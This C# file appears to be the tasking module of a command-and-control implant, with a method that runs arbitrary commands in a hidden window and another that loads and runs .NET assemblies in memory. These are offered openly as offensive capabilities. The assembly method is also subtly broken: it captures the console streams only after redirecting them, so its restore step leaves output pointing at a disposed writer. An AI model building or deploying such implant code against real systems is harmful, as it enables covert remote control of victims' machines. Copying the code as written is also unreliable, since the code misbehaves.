using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Internal
{
    public static class Execute
    {
        public static string ExecuteCommand(string fileName, string arguements)
        {

  
            var startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguements,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true

            };

            var process = Process.Start(startInfo);

            string output = "";

            using (process.StandardOutput)
            {
                output += process.StandardOutput.ReadToEnd();

            }

            using (process.StandardError)
            {
                output += process.StandardError.ReadToEnd();
            }

            return output;

            // cmd.exe /c <command>
        }

        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
        {

            if (arguments is null)
                arguments = new string[] { };

            var ms = new MemoryStream();
            var sw = new StreamWriter(ms);
            {
                sw.AutoFlush = true;
            };

            Console.SetOut(sw);
            Console.SetError(sw);

            var currentOut = Console.Out;
            var currentError = Console.Error;


            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { arguments });

            Console.Out.Flush();
            Console.Error.Flush();

            var output = Encoding.UTF8.GetString(ms.ToArray());

            Console.SetOut(currentOut);
            Console.SetError(currentError);

            sw.Dispose();
            ms.Dispose();

            return output; 
        
        }

    }
}
